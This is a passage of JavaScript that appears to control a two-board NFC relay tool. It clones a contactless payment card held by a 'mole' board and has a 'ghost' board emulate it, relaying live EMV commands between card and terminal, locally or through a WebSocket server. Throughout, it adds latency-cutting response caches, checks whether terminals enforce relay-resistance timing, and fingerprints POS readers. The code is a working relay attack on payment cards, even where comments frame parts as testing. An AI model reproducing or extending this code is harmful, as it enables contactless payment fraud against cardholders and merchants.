}

// Show only the controls relevant to the selected role.
function applyRole() {
  const role = currentRole();
  $('ghost-card').hidden = (role === 'mole');
  $('mole-card').hidden = (role === 'ghost');
  $('link-row').hidden = (role === 'local');
  if ($('mode-row')) $('mode-row').hidden = (role === 'mole');   // (Mode selector removed)
  updateStartEnabled();
}

// Derive the http(s) /health URL from the ws(s):// server URL.
function healthUrlFrom(wsUrl) {
  try {
    const u = new URL(wsUrl);
    u.protocol = (u.protocol === 'wss:') ? 'https:' : 'http:';
    u.pathname = '/health'; u.search = ''; u.hash = '';
    return u.toString();
  } catch { return null; }
}

// Pre-warm a sleeping Render free-tier service: poll /health until it answers.
async function wakeServer() {
  const url = healthUrlFrom($('server-url').value.trim());
  if (!url) { log('enter the relay server URL first', 'warn'); return false; }
  $('link-status').textContent = 'waking server…';
  log('waking relay server (free-tier cold start can take ~30-60s)…');
  const t0 = Date.now();
  while (Date.now() - t0 < 80000) {
    try { const r = await fetch(url, { cache: 'no-store' }); if (r.ok) { log('relay server is awake', 'ok'); $('link-status').textContent = 'server awake'; return true; } } catch (_) {}
    await sleep(3000);
  }
  log('relay server did not wake within 80s — try again', 'warn');
  $('link-status').textContent = 'wake timed out';
  return false;
}

async function toggleLink() {
  if (wsLink.connected) { wsLink.close(); return; }
  const url = $('server-url').value.trim();
  const room = $('room-code').value.trim();
  if (!url || !room) { log('enter a server URL and room code', 'warn'); return; }
  try {
    await wakeServer();   // best-effort pre-warm so the first connect doesn't cold-start-timeout
    log(`connecting to relay ${url} room "${room}" as ${currentRole()}…`);
    wsLink.onClose = () => { log('relay link closed', 'warn'); $('link-btn').textContent = 'Connect link'; $('link-status').textContent = 'not connected'; if (running) stopRelay(); updateStartEnabled(); };
    wsLink.onPeers = (m) => { $('link-status').textContent = `linked · ${m.n}/2 in room (${(m.roles || []).join(', ') || '—'})`; };
    const j = await wsLink.connect(url, room, currentRole());
    $('link-btn').textContent = 'Disconnect link';
    $('link-status').textContent = `linked · ${j.n}/2 in room`;
    log(`relay link up — ${j.n}/2 in room "${room}"`, 'ok');
    updateStartEnabled();
  } catch (e) {
    log(`link connect failed: ${e.message || e}`, 'err');
  }
}

async function toggleConnect(who) {
  const dev = who === 'ghost' ? ghost : mole;
  if (dev.connected) { await dev.disconnect(); return; }
  try {
    log(`select board for ${who.toUpperCase()} (${who === 'ghost' ? 'terminal/phone side' : 'card side'})…`);
    dev.onDisconnect = () => { log(`${who} disconnected`, 'warn'); setDevUI(who, dev); if (running) stopRelay(); };
    await dev.connect();
    log(`${who.toUpperCase()} connected: fw ${dev.fw}${dev.git ? ' git ' + dev.git : ''}${dev.battPct != null ? ' · 🔋 ' + dev.battPct + '%' : ''}`, 'ok');
    // Connected + idle (no relay running) = AMBER on both boards. The relay
    // states (green = card responding, red = no card, blue = relaying) take over
    // once you Start, and it returns to amber on Stop.
    try { await dev.setLed(5); } catch (_) {}       // 5 = amber (idle)
    setLedUI(who, 'amber');
    log(`${who.toUpperCase()} is the board now showing ${who === 'ghost' ? 'RED' : 'BLUE'} — ` +
        `place the ${who === 'ghost' ? 'RED (ghost) at the terminal/phone' : 'BLUE (mole) at the card'}.`, 'ok');
    setDevUI(who, dev);
  } catch (e) {
    log(`${who} connect failed: ${e.message || e}`, 'err');
  }
}

async function safeProbe(dev) {
  try { const p = await dev.cardProbe(false); return p.status === ST.HF_TAG_OK; }
  catch (_) { return false; }
}

async function armGhost(anti, slot, staticPairs, dev = ghost) {
  await dev.setActiveSlot(slot);
  await dev.setSlotTagType(slot, TAG_HF14A_4);
  await dev.setSlotEnable(slot, SENSE_HF, true);
  try { await dev.clearStaticResponses(); } catch (e) {}  // safety: never serve a stale cache
  cacheReset();
  // Advertise a LARGE frame size (FSC=256, FSCI=8) in the ghost's ATS so the
  // reader sends each command in ONE frame (no chaining). Forcing a SMALL FSC to
  // make the reader chain a big GPO did NOT work: this reader ignores the
  // advertised FSC and sends the big frame anyway, and forcing it wedged the T=CL
  // flow. With FSC=256 normal cards relay fine (their commands fit one frame); a
  // big-PDOL card whose command the nRF52 NFCT truncates on RX is dropped by the
  // CRC guard (fails cleanly, card not corrupted) rather than relayed as garbage.
  // ATS = [TL][T0]...; FSCI is T0's low nibble.
  if (anti.ats && anti.ats.length >= 2) {
    const fsci = anti.ats[1] & 0x0F;
    if (fsci < 8) { anti.ats[1] = (anti.ats[1] & 0xF0) | 0x08; log(`ghost ATS FSCI ${fsci}->8 (FSC 256)`, 'ok'); }
  }
  await dev.setAntiColl(anti);   // anti-coll BEFORE emulator mode
  if (staticPairs && staticPairs.length) {
    let n = 0;
    // Batch-load: one (or few) frames instead of one round-trip per pair.
    try { n = await dev.addStaticResponseBatch(staticPairs); for (const p of staticPairs) cachedCmds.add(hxc(p.cmd)); }
    catch (e) { log('batch cache load failed, falling back to per-pair…', 'warn');
      n = 0; for (const p of staticPairs) { try { await dev.addStaticResponse(p.cmd, p.resp); n++; cachedCmds.add(hxc(p.cmd)); } catch (_) {} } }
    cacheCount = n; setCacheStatus('prefill');
    log(`loaded ${n}/${staticPairs.length} cached responses into the ${dev.label} (batched)`, 'ok');
  }
  await dev.changeMode(false);   // tag / emulator mode
}

async function cloneFromMole(M, slot) {
  let warned = false;
  while (running) {
    let p;
    try { p = await M.cardProbe(true); } catch (_) { await sleep(300); continue; }
    if (p.status === ST.HF_TAG_OK) {
      // Close any session left open by a previous tap before re-opening, or the
      // stale session wedges the RC522 and the new relayStart fails (later taps
      // stop working). Guarded no-op on the firmware side if nothing is open.
      try { await M.relayStop(); } catch (_) {}
      const r = await M.relayStart();
      if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) return r.parsed;
    } else {
      M.setLed(3).catch(() => {}); setLedUI('mole', 'red');
      if (!warned) { log('no card on the mole — place the card…', 'warn'); warned = true; }
    }
    await sleep(300);
  }
  return null;
}

async function startRelay() {
  if (running) return;
  const role = currentRole();
  if (role === 'mole') return startMoleServe();   // mole phone serves; the ghost phone drives
  // mole-facing side: the local board (Local mode) or the remote mole over WS (Ghost mode)
  const M = (role === 'ghost') ? wsLink.mole : mole;
  if (role === 'ghost' && !wsLink.connected) { log('not connected to the relay server', 'err'); return; }
  running = true; apduCount = 0; rrpSeenThisRun = false; rrpResolved = false; setRrpBadge('watch');
  curPdol = null; curCdol1 = null; curTermData = {}; recognisedThisRun = false;
  txStepReset();   // show the empty transaction progress bar, ready for the first tap
  acquireWakeLock();
  updateStartEnabled();
  // (Mode B / card-presence gating was removed: its idle ATQA probe misfired
  // while a reader looped and churned the mole RC522. The ghost always emulates.)
  const slot = parseInt($('slot').value, 10) || 1;
  const cacheMode = ($('cache') && $('cache').value) || 'off';   // 'off' | 'prefill'
  // HCE/phone-card mode: a phone's emulated card only survives ONE continuous
  // reader field. Re-cloning (relayStop/relayStart) power-cycles the mole field
  // and kills the phone's session + re-randomises its UID. So in this mode we
  // keep the single initial session: never re-clone, never recover — just relay.
  const hceMode = !!($('hce') && $('hce').checked);
  // Adaptive poll: tight while a transaction is live (the phone is WTX-stalled
  // waiting on us, so every ms of poll gap is added latency), relaxed when idle
  // to spare BLE/CPU/battery. Safe on a slow link: the transport is strictly
  // one-command-at-a-time, so the real rate self-caps to the BLE round-trip —
  // this only removes dead time, it can't flood the connection.
  const ACTIVE_POLL = 15, IDLE_POLL = 150, ACTIVE_WINDOW = 2500;
  // Grouped-fetch on-device block: just above the phone's worst inter-APDU think
  // time (~230ms observed) so mid-transaction pre-fetch stays reliable, but the
  // end-of-transaction tail is ~this instead of the 600ms default. Tunable here.
  const GROUP_WAIT_MS = 400;
  let lastApduAt = Date.now();
  const pollDelay = () => (Date.now() - lastApduAt < ACTIVE_WINDOW) ? ACTIVE_POLL : IDLE_POLL;
  $("status").textContent = "relaying";
  log(`=== relay started: slot ${slot} ===`, 'ok');

  try {
    // Read the negotiated BLE interval while both boards are still IDLE — doing
    // it after arming would inject a command into the ghost while the relay loop
    // has taken over its BLE channel, which desyncs/crashes the emulation.
    await logConnParams();
    // Put the MOLE into reader mode first: this initialises the RC522. Probing
    // the field (card_probe/relay_start) before this faults the board on an
    // uninitialised RC522 and drops BLE (role_mole does set_device_reader_mode).
    await M.changeMode(true);
    // stale-card fix: force ghost OUT of emulator mode before cloning, else it
    // keeps emulating the previous run's card (slot persists in flash).
    await ghost.changeMode(true);
    ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red');

    const anti = await cloneFromMole(M, slot);
    if (!anti) { return; }            // stopped while waiting
    log(`cloned card UID=${hex(anti.uid)} ATQA=${hex(anti.atqa)} SAK=${anti.sak.toString(16)} ATS=${hex(anti.ats)}`, 'ok');

    let staticPairs = null;
    if (cacheMode === 'prefill') {
      log('cache ON: pre-reading card static flow (one-time, adds a few s to Start)…', 'ok');
      staticPairs = await buildStaticCache(M);   // read PPSE/SELECT/GPO/records/GETDATA off the live card
    }
    await armGhost(anti, slot, staticPairs);
    ghost.setLed(1).catch(() => {}); setLedUI('ghost', 'green'); setLedUI('mole', 'green');
    log('relay loop running — tap the terminal/phone on board1.', 'ok');

    let lastStat = 0;
    let pending = null;                    // next APDU already fetched by a grouped send-recv
    let emptyStreak = 0;                   // consecutive empty relay results -> session recovery
    let stallCount = 0;                    // consecutive failed relays w/ no progress -> graceful stop
    const STALL_LIMIT = hceMode ? 12 : 30; // give up (clean stop) instead of thrashing/rebooting
    if (hceMode) log('HCE/phone-card mode: single continuous session, no re-clone/recovery.', 'ok');
    let sawIdle = true;                    // idle since last APDU -> next APDU starts a new tap
    let lastRx = -1;                       // ghost RF-frame counter (cached-tap activity feedback)
    // Transaction cycle timer: wall time from the FIRST APDU of a tap (card first
    // driven by the phone) to the LAST (phone finished reading). Logged when the
    // tap goes idle. This is the real "first contact -> fully read" number.
    let tapT0 = null, tapN = 0, tapTlast = 0, lastHit = 0;   // lastHit: cache-serve count at prev tap end
    let ghostHealth = 1;   // ghost board LED: 1=green (card responding), 3=red (mole not answering); armed green
    const EMPTY = new Uint8Array([0, 0]);  // resp_len 0 => pure blocking recv (send nothing)
    while (running) {
      // Clear-cache requested from the button: do it here, in the loop's own context
      // (no concurrent BLE write to collide with relay traffic -> no timeout).
      if (clearRequested) {
        clearRequested = false;
        try { await ghost.clearStaticResponses(); cacheReset(); log('ghost static cache cleared', 'ok'); }
        catch (e) { log('clear cache failed: ' + (e.message || e), 'err'); }
      }
      // Get the APDU to process: one a prior grouped send-recv already fetched
      // (no wait), else block ON-DEVICE for the next one (no polling round-trips).
      let apdu;
      const tWait0 = performance.now();
      if (pending !== null) {
        apdu = pending; pending = null;
      } else {
        let r0;
        try { r0 = await ghost.apduSendRecv(EMPTY); } catch (_) { await sleep(pollDelay()); continue; }
        if (r0.status !== ST.SUCCESS) {
          // Tap just ended -> report cycle spans + cache-served/relayed breakdown.
          if (tapT0 !== null && tapN > 0) {
            const cache = cacheMode === 'prefill' ? 'cache ON' : 'cache OFF';
            let served = -1;
            if (cacheMode === 'prefill') { const h = await ghost.hitCount(); if (h >= 0) { served = h - lastHit; lastHit = h; } }
            const mix = served >= 0 ? `${served} cache-served + ${tapN} relayed = ${served + tapN} cmds` : `${tapN} relayed`;
            log(`=== transaction cycle (${cache}): ghost↔phone ${(tapTlast - tapT0).toFixed(0)} ms (first phone cmd → last response) · ${mix} ===`, 'ok');
            tapT0 = null; tapN = 0;
          }
          // idle (no APDU within the on-device block): mirror LED / Mode B disarm
          const now = Date.now();
          if (now - lastStat > 1000) {
            lastStat = now;
            const present = await safeProbe(M);   // is the card still on the mole?
            ghost.setLed(present ? 1 : 3).catch(() => {});
            setLedUI('ghost', present ? 'green' : 'red'); setLedUI('mole', present ? 'green' : 'red');
            // Cached-tap feedback: with cache ON a tap is served in-ISR and never
            // reaches us, so the portal looks idle. The ghost's RF-frame counter still
            // climbs — surface it so you can see a cached tap happened.
            if (cacheMode === 'prefill') {
              const rc = await ghost.rxCount();
              if (rc >= 0 && lastRx >= 0 && rc !== lastRx) {
                setLedUI('ghost', 'blue'); setLedUI('mole', 'blue');
                log(`cached tap: ghost served ${((rc - lastRx + 256) % 256)} reader frame(s) from cache`, 'ok');
              }
              if (rc >= 0) lastRx = rc;
            }
          }
          sawIdle = true;   // no APDU this window -> the next one starts a new tap
          continue;   // the ~600ms block already paced us; no extra sleep
        }
        apdu = r0.data;
      }
      const wait = performance.now() - tWait0;   // ~0 if pre-fetched, else the block wait
      lastApduAt = Date.now();
      if (tapT0 === null) tapT0 = performance.now();   // first phone command of this tap
      tapN++;

      // New tap = PPSE reaching us, OR the first APDU after an idle gap. The idle
      // case matters with the cache ON: PPSE is served in-ISR from cache and never
      // reaches the loop, so without this the mole session from the previous tap
      // goes stale and later taps fail. Re-clone gives each tap a fresh session.
      // Re-clone ONLY on a real idle gap (a distinct tap), NOT on every PPSE.
      // Re-cloning per PPSE meant relayStop/relayStart on every loop pass, and
      // under a continuously-looping reader that RC522 churn accumulates and wedges
      // the card (first reads fine, then it degrades into a brute-force + silence).
      // Keeping one mole session across a loop is fine for reads; a distinct tap
      // still re-clones because the idle sets sawIdle. (cache-ON already relies on
      // sawIdle since PPSE is served in-ISR and never reaches the loop.)
      if (sawIdle && !hceMode) {
        log('--- new transaction (tap) --- re-opening mole session', 'ok');
        await cloneFromMole(M, slot);   // fresh card session for a fresh cryptogram
        apduCount = 0;
        curPdol = null; curCdol1 = null;   // DOL layouts are per-card/per-tap
        if (!rrpSeenThisRun) rrpResolved = false;  // re-watch RRP for the new tap
        txStepReset();                     // fresh progress bar for the new tap
      }
      sawIdle = false;
      // Progress bar: PPSE (step 0) starts a fresh transaction, then each command
      // class advances it. Resetting on PPSE makes it per-transaction, so several
      // taps in one relay session each get their own clean run.
      { const st = txStepFor(apdu); if (st === 0) txStepReset(); if (st >= 0) txStepMark(st); }
      // Diagnostic: show the FULL command the ghost assembled for GPO / GENERATE AC
      // (the state-critical, PDOL/CDOL-carrying commands). If a card with a big PDOL
      // shows a short length here, the ghost truncated a multi-frame command.
      if (apdu.length >= 2 && apdu[0] === 0x80 && (apdu[1] === 0xA8 || apdu[1] === 0xAE)) {
        const nm = apdu[1] === 0xA8 ? 'GPO' : 'GEN AC';
        const lc = apdu.length >= 5 ? apdu[4] : -1;
        log(`>> ${nm} len=${apdu.length} (Lc=${lc}) ${hex(apdu).trim()}`, lc >= 0 && apdu.length < 5 + lc ? 'warn' : 'ok');
      }
      // Terminal RRP enforcement: EXCHANGE RELAY RESISTANCE DATA (80 EA). If the
      // reader sends this, it is time-checking the relay (distance bounding).
      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xEA) {
        if (!rrpSeenThisRun) log('⚠ terminal sent EXCHANGE RELAY RESISTANCE DATA (80 EA) — this reader ENFORCES RRP; the relay is being time-checked', 'warn');
        rrpSeenThisRun = true; setRrpBadge('enforced');
      }
      // Live RRP verdict: RRP (80 EA) is sent BETWEEN GPO and READ RECORD, so the
      // moment we relay a READ RECORD (00 B2) with no prior 80 EA this reader did
      // not run RRP on this tap — settle the badge now instead of waiting for Stop.
      if (apdu.length >= 2 && apdu[0] === 0x00 && apdu[1] === 0xB2 && !rrpSeenThisRun && !rrpResolved) {
        rrpResolved = true; setRrpBadge('clear');
        log('reached READ RECORD with no 80 EA — reader did NOT run RRP on this tap', 'ok');
      }
      // Terminal fingerprint: GPO command carries PDOL data (tag 83) if the card
      // has a PDOL; GENERATE AC command carries CDOL1 data. Parse against the
      // layout we learned from this card's SELECT/READ responses.
      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xA8 && curPdol && apdu.length > 5) {
        const inner = tlvFind(apdu.slice(5, 5 + apdu[4]), 0x83)[0];
        if (inner) { mergeTermData(curTermData, parseDolData(curPdol, inner)); noteReader(); }
      }
      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xAE && curCdol1 && apdu.length > 5) {
        mergeTermData(curTermData, parseDolData(curCdol1, apdu.slice(5, 5 + apdu[4])));
        noteReader();
      }
      setLedUI('ghost', 'blue'); setLedUI('mole', 'blue');
      const tGot = performance.now();
      let rr;
      try { rr = await M.relayApdu(apdu); }
      catch (_) { rr = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
      const tRelay = performance.now();
      const resp = rr.status === ST.HF_TAG_OK ? rr.data : new Uint8Array(0);
      // Learn this card's DOL layouts from its responses so we can decode the
      // terminal data the reader sends next: SELECT (00 A4) FCI -> PDOL (9F38);
      // READ RECORD (00 B2) -> CDOL1 (8C).
      if (resp.length) {
        if (apdu[0] === 0x00 && apdu[1] === 0xA4) { const p = tlvFind(resp, 0x9f38)[0]; if (p) curPdol = p; }
        if (apdu[0] === 0x00 && apdu[1] === 0xB2 && !curCdol1) { const c = tlvFind(resp, 0x8c)[0]; if (c) curCdol1 = c; }
      }
      // "fully read" = response ready to deliver, BEFORE the grouped fetch's wait
      // (which on the final command idles ~GROUP_WAIT_MS for a next command that
      // never comes — that would inflate the cycle).
      tapTlast = performance.now();
      // Session auto-recovery: if the card decouples mid-transaction the mole
      // fast-fails (empty) on every APDU and a chatty reader loops forever. After a
      // few consecutive empties, re-clone the mole session so it recovers the moment
      // the card is back in contact instead of dead-looping.
      if (rr.status !== ST.HF_TAG_OK) {
        emptyStreak++; stallCount++;
        // HCE mode: do NOT re-clone (that power-cycle kills the phone session).
        if (emptyStreak === 3 && !hceMode) {
          log('mole giving empty responses — re-cloning session…', 'warn');
          try { await M.relayStop(); } catch (_) {}
          try {
            const rc = await M.relayStart();
            if (rc.status === ST.HF_TAG_OK) { log('mole session recovered', 'ok'); emptyStreak = 0; }
          } catch (_) {}
        }
        // Graceful stall: stop cleanly instead of thrashing the boards forever.
        if (stallCount >= STALL_LIMIT) {
          log(`=== relay stalled: ${stallCount} card responses with no progress — stopping. ===`, 'err');
          // Definitive present-vs-gone: try one full re-activation of the mole card.
          try {
            await M.relayStop();
            const rc = await M.relayStart();
            if (rc.status === ST.HF_TAG_OK)
              log('DIAGNOSIS: card is STILL PRESENT (re-activation OK) → it answers RATS but ignores every APDU = applet DORMANT/silent, not decoupled. A phone wallet does this when its payment applet isn\'t live.', 'warn');
            else
              log('DIAGNOSIS: card is GONE (re-activation failed) → it physically decoupled / RF-deactivated mid-flow. Reposition/hold it steadier.', 'warn');
            await M.relayStop();
          } catch (_) {}
          break;   // -> finally releases both boards to normal
        }
      } else { emptyStreak = 0; stallCount = 0; }
      // GROUPED: deliver the response AND fetch the next APDU in one round-trip.
      // The on-device wait for the phone's next command replaces the poll gap.
      let rg;
      try { rg = await ghost.apduSendRecv(resp, GROUP_WAIT_MS); }
      catch (_) { rg = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
      const tSend = performance.now();
      if (rg.status === ST.SUCCESS) pending = rg.data;   // next APDU in hand -> no gap next iter
      apduCount++;
      log(`#${apduCount}  ->card ${hex(apdu)}`);
      log(`     card-> ${hex(resp)}  (st=${rr.status})`, resp.length ? '' : 'warn');
      // timing: wait = time to obtain this APDU (~0 if pre-fetched), relay = mole
      // round-trip, sendrecv = deliver response + on-device wait for the next APDU
      log(`     t: wait ${wait.toFixed(0)}ms · relay ${(tRelay - tGot).toFixed(0)}ms · sendrecv ${(tSend - tRelay).toFixed(0)}ms`);
      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xEA) {
        const rt = tSend - tGot;   // the round-trip the POS time-checks (relay to card + deliver back)
        log(`     ⚠ RRP TIMING: 80 EA round-trip ≈ ${rt.toFixed(0)}ms vs the ~sub-millisecond a POS distance-bound allows → ~${Math.max(1, Math.round(rt)).toLocaleString()}× over budget, so an enforcing terminal time-rejects this relay`, 'warn');
      }
      if (!resp.length) log('empty card response — terminal will likely abort this APDU', 'warn');
      // LED reflects the actual relay result: green = card responded, red = mole
      // not answering (no card). Drive the ghost BOARD LED on TRANSITIONS only
      // (after the response is already delivered) so it never churns the ghost
      // channel per-APDU or delays a response.
      const ok = rr.status === ST.HF_TAG_OK;
      setLedUI('ghost', ok ? 'green' : 'red'); setLedUI('mole', ok ? 'green' : 'red');
      const gh = ok ? 1 : 3;
      if (gh !== ghostHealth) { ghost.setLed(gh).catch(() => {}); ghostHealth = gh; }
    }
  } catch (e) {
    log(`relay error: ${e.message || e}`, 'err');
  } finally {
    try { await M.relayStop(); } catch (_) {}
    // Stop emulating on the ghost, and set both boards back to AMBER (connected,
    // idle) — the same state as right after connecting.
    try { await ghost.changeMode(true); } catch (_) {}
    try { await ghost.setLed(5); } catch (_) {}
    try { if (mole && mole.connected) await mole.setLed(5); } catch (_) {}
    setLedUI('ghost', 'amber'); setLedUI('mole', 'amber');
    releaseWakeLock();
    running = false;
    $('status').textContent = 'stopped';
    log(`=== relay stopped after ${apduCount} APDUs ===`);
    updateStartEnabled();
  }
}

// Mole phone (Phase 2): connect the local mole board, join the room, and SERVE
// the ghost phone's requests onto the board. All board access is serialised
// through one chain so the periodic LED probe never overlaps a relayed APDU.
async function startMoleServe() {
  if (!mole.connected) { log('mole board not connected', 'err'); return; }
  if (!wsLink.connected) { log('not connected to the relay server', 'err'); return; }
  running = true; acquireWakeLock(); updateStartEnabled();
  $('status').textContent = 'serving (Mole)';
  log('=== mole serving — waiting for the ghost phone to drive ===', 'ok');
  try { await mole.changeMode(true); } catch (_) {}   // RC522 init

  let chain = Promise.resolve();
  const enqueue = (fn) => { const r = chain.then(fn, fn); chain = r.catch(() => {}); return r; };

  wsLink.onReq = (m) => { enqueue(() => handleMoleReq(m)); };

  let lastStat = 0;
  while (running && wsLink.connected) {
    const now = Date.now();
    if (now - lastStat > 1200) {
      lastStat = now;
      await enqueue(async () => {
        const present = await safeProbe(mole);
        mole.setLed(present ? 1 : 3).catch(() => {});
        setLedUI('mole', present ? 'green' : 'red');
      });
    }
    await sleep(200);
  }
  wsLink.onReq = null;
  try { await mole.relayStop(); } catch (_) {}
  try { await mole.setLed(0); } catch (_) {}
  setLedUI('mole', '');
  releaseWakeLock();
  running = false;
  $('status').textContent = wsLink.connected ? 'stopped' : 'link lost';
  log('=== mole serving stopped ===');
  updateStartEnabled();
}

let moleApduN = 0;
async function handleMoleReq(m) {
  try {
    if (m.t === 'scan') {
      log('ghost requested card (scan) — cloning…');
      const anti = await moleServeClone();
      if (anti) {
        setLedUI('mole', 'green'); moleApduN = 0;
        log(`cloned card UID=${hex(anti.uid)} ATS=${hex(anti.ats)} — sent to ghost`, 'ok');
        wsLink.send({ t: 'scan_res', uid: hxc(anti.uid), atqa: hxc(anti.atqa), sak: anti.sak, ats: hxc(anti.ats) });
      } else {
        log('no card on the mole — told ghost to wait', 'warn');
        wsLink.send({ t: 'scan_res' });   // no uid = no card
      }
    } else if (m.t === 'apdu') {
      setLedUI('mole', 'blue');
      const apdu = hexToBytes(m.apdu);
      let r; try { r = await mole.relayApdu(apdu); } catch (_) { r = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
      const resp = r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0);
      moleApduN++;
      log(`#${moleApduN} ->card ${hex(apdu)}`);
      log(`     card-> ${hex(resp)}  (st=${r.status})`, resp.length ? '' : 'warn');
      wsLink.send({ t: 'apdu_res', st: r.status, data: hxc(resp) });
      setLedUI('mole', 'green');
    } else if (m.t === 'stat') {
      let present = false; try { present = (await mole.cardProbe(!!m.force)).status === ST.HF_TAG_OK; } catch (_) {}
      wsLink.send({ t: 'stat_res', present });   // no log — fires ~1/s
    } else if (m.t === 'stop') {
      log('ghost ended session (stop)');
      try { await mole.relayStop(); } catch (_) {}
    }
  } catch (e) { log('mole serve error: ' + (e.message || e), 'err'); }
}

async function moleServeClone() {
  // Close any prior relay session first so the re-scan is clean — otherwise the
  // card is left in T=CL (ignores the plain probe) and the mole reads as no-card
  // after a few cycles. relay_stop powers the field off; relay_start re-RATSes.
  try { await mole.relayStop(); } catch (_) {}
  const t0 = Date.now();
  while (Date.now() - t0 < 2500 && running) {
    try {
      if ((await mole.cardProbe(true)).status === ST.HF_TAG_OK) {
        const r = await mole.relayStart();
        if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) return r.parsed;
      } else { setLedUI('mole', 'red'); }
    } catch (_) {}
    await sleep(250);
  }
  return null;
}

function stopRelay() {
  running = false;
  txStepShow(false);   // hide the transaction progress bar
  // Reader-RRP verdict for the session just ended (only meaningful if you relayed an
  // RRP-ADVERTISING card, e.g. the Mastercard — a card that doesn't advertise RRP will
  // never make the reader send 80 EA).
  if (rrpSeenThisRun) {
    log('=== RRP VERDICT: this reader ENFORCED RRP (saw 80 EA) — relay would be time-rejected ===', 'warn');
    setRrpBadge('enforced');
  } else if (apduCount > 0) {
    log('=== RRP VERDICT: no 80 EA seen this session. Reader did NOT run RRP — but only conclusive if you relayed an RRP-advertising card (Mastercard) and the flow reached GPO ===', 'ok');
    setRrpBadge('clear');
  } else {
    setRrpBadge('none');
  }
  // Persist / update this reader in the stored list.
  const verdict = rrpSeenThisRun ? 'enforced' : (apduCount > 0 ? 'no-ea' : 'idle');
  const rec = recordReader(curTermData, verdict);
  if (rec) {
    log(`reader stored: "${rec.name}" — ${rrpLabel(rec.rrp)} · ${readerSummary(curTermData)} (seen ${rec.seen}×). Rename in Readers.`, 'ok');
    renderReaders();
  } else if (apduCount > 0) {
    log('reader not stored: no terminal fingerprint captured (empty-PDOL card, blocked before GENERATE AC). RRP verdict shown above.', 'warn');
  }
}

// Diagnostic: dump the raw reader frames the ghost captured (cmd 6009), so we can
// see exactly how a given reader (Flipper, phone, POS) frames its T=CL commands.
async function dumpRxLog() {
  if (!ghost.connected) { log('connect the ghost board first', 'warn'); return; }
  let r;
  try { r = await ghost.sendCmd(CMD.HF14A_4_RX_LOG, new Uint8Array([0]), 3000); }
  catch (e) { log('RX log read failed: ' + (e.message || e), 'err'); return; }
  const d = r.data;
  if (d.length < 4) { log('RX log empty', 'warn'); return; }
  const count = d[0], head = d[1], entries = d[2], ebytes = d[3];
  const n = Math.min(count, entries);
  log(`--- ghost RX log: ${count} reader frames (showing ${n}, oldest first) ---`, 'ok');
  for (let k = 0; k < n; k++) {
    const idx = (head - n + k + entries) % entries;
    const off = 4 + idx * (1 + ebytes);
    const lenBits = d[off];
    const nb = Math.min(Math.round(lenBits / 8), ebytes);
    log(`  rx[${k}] ${lenBits}b: ${hex(d.slice(off + 1, off + 1 + nb))}`);
  }
}

async function clearCache() {
  // Also drop the saved RRP POS-test lure so it rebuilds from the card next time.
  try { if (localStorage.getItem(RRP_PROFILE_KEY)) { localStorage.removeItem(RRP_PROFILE_KEY); log('saved RRP lure cleared — the next RRP POS test will rebuild it from the card on the mole', 'ok'); } } catch (_) {}
  if (!ghost.connected) { log('ghost not connected — saved RRP lure cleared; connect the ghost to also wipe its on-device cache', 'warn'); return; }
  // While the relay loop runs it monopolises the ghost BLE channel; a concurrent
  // clear collides/times out. Hand it to the loop, which clears at the next gap.
  if (running) {
    clearRequested = true;
    log('clear cache requested — clearing at the next gap…', 'ok');
    return;
  }
  try { await ghost.clearStaticResponses(); cacheReset(); log('ghost static cache cleared', 'ok'); }
  catch (e) { log('clear cache failed: ' + (e.message || e), 'err'); }
}

// --- DOL (PDOL/CDOL) synthesis for the payment-flow test ---------------------
// Default terminal values for the tags a card asks for. Enough to make the card
// compute a cryptogram (for latency measurement); NOT a real/authorisable txn.
function bcd(n) { return ((Math.floor(n / 10) << 4) | (n % 10)) & 0xff; }
function dolValue(tag, len) {
  const out = new Uint8Array(len);            // default = zeros
  const put = (arr) => { const b = u8(arr); out.set(b.slice(0, len), Math.max(0, len - b.length)); };
  const now = new Date();
  switch (tag) {
    case 0x9F02: put([0, 0, 0, 0, 1, 0]); break;                 // amount authorised = 1.00
    case 0x9F1A: put([0x00, 0x56]); break;                       // terminal country (BE)
    case 0x5F2A: put([0x09, 0x78]); break;                       // txn currency (EUR)
    case 0x9A:   put([bcd(now.getFullYear() % 100), bcd(now.getMonth() + 1), bcd(now.getDate())]); break;
    case 0x9F21: put([bcd(now.getHours()), bcd(now.getMinutes()), bcd(now.getSeconds())]); break;
    case 0x9C:   put([0x00]); break;                             // txn type = purchase
    case 0x9F35: put([0x22]); break;                             // terminal type
    case 0x9F33: put([0xE0, 0xF8, 0xC8]); break;                 // terminal capabilities
    case 0x9F66: put([0x36, 0x00, 0x00, 0x00]); break;           // TTQ (contactless)
    case 0x9F37: { const r = new Uint8Array(len); crypto.getRandomValues(r); out.set(r); break; }  // unpredictable number
    default: break;                                             // everything else = zeros
  }
  return out;
}
// Parse a DOL (tag-length pairs) and build the concatenated value string.
function buildDol(dol) {
  const parts = []; let i = 0;
  while (i < dol.length) {
    let tag = dol[i], tl = 1;
    if ((dol[i] & 0x1f) === 0x1f) { tag = (dol[i] << 8) | dol[i + 1]; tl = 2; }
    i += tl; if (i >= dol.length) break;
    const len = dol[i++];
    parts.push(dolValue(tag, len));
  }
  return concat(...parts);
}

// --- Reader recognition + store ---------------------------------------------
// A terminal has no UID to advertise, so we fingerprint it from the terminal
// data it leaks INTO the transaction: PDOL data (GPO) if the card has a PDOL,
// else CDOL data (GENERATE AC). Stable tags only (country/type/caps/TTQ/IDs) —
// volatile ones (unpredictable number, amount, date/time, TVR, ATC) are excluded
// so the same reader fingerprints identically tap to tap. Two identical POS
// units with no unique Terminal ID (9F1C) collide -> rename to disambiguate.
// Reverse of buildDol: split concatenated DOL values back into a tag->bytes map.
function parseDolData(dol, data) {
  const out = {}; let i = 0, di = 0;
  while (i < dol.length) {
    let tag = dol[i], tl = 1;
    if ((dol[i] & 0x1f) === 0x1f) { tag = (dol[i] << 8) | dol[i + 1]; tl = 2; }
    i += tl; if (i >= dol.length) break;
    const len = dol[i++];
    out[tag] = data.slice(di, di + len); di += len;
  }
